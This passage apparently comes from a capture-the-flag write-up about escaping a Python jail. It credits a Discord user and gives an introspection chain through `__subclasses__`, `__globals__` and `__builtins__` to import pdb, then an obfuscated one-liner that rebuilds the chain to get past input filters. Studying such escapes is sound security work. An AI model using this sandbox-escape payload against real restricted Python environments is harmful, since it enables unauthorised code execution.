...
Also by @ark from Discord, using chain `{}.__class__.__subclasses__()[-1].__pos__.__globals__["__builtins__"]["__import__"]("pdb").test()`:

```python
[{}.__class__[1111111111111111111111111111].__subclasses__()[~(()>())].__pos__,1111111111111111111111][()>()].__globals__["1111111111111111111111111111111111.11111111111111111.1111111111111111111111111111111111111111111111111111.11111111111111111111111111.1__builtins__"[0x00000000000000000000000000000000000086:0x000000000000000092]]["__import__"]("pdb11"[0x00000000000000:0x000003]).test()#11 1
```
